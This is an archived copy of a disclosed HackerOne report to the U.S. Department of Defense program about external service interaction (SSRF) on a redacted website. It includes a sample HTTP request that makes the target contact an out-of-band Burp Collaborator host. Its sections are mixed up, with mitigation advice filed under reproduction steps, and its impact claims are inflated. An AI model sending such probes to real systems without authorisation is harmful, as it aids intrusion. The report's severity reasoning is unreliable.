---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/server-side-request-forgery-ssrf
  - env/network
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2023-06-23
submitted: 2022-09-19T00:13:29.558Z
bounty_usd: null
votes: 14
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "0xmzm"
source: "https://hackerone.com/reports/1704024"
title: "External service interaction ( DNS and HTTP ) in www.████████"
---
# External service interaction ( DNS and HTTP ) in www.████████

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 14 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2023-06-23

- Report: [https://hackerone.com/reports/1704024](https://hackerone.com/reports/1704024)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2022-09-19T00:13:29.558Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

There is External service interaction ( DNS and HTTP ) vulnerability in www.█████████

Here is an example request :
```
GET http://9eoecirvai3o4lsdrpqzvyia71dr1g.oastify.com/ HTTP/1.1
Host: www.██████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.██████/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

```
And the Burp Collaborator recived this information :
DNS request recived from : ████████
HTTP request recived from : ███

███
█████████

## Impact

The External Service Interaction arise when it is possible for a attacker to induce application to interact with the arbitrary external service such as DNS HTTP etc.
The External Service Interaction can is not limited to HTTP,HTTPS or DNS, you can lead to FTP, SMTP etc. Such weakness can lead to DDoS attack.
The External Service Interaction can lead to OS Command Injection, DOS Attack, DDOS Attack or Code Manipulation.

## System Host(s)
www.████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Use whitelist check, boundary based validation and sanitization.
Maintain whitelist at network and web front.
Review Source Code for functions such as dns.resolve() , dns.query() , sys_exec() etc.

## Suggested Mitigation/Remediation Actions

## Timeline

- **Report Filed**
- **2022-09-19** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **2022-10-25** @billthomas6789: ████ Vulnerability has not been resolved
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
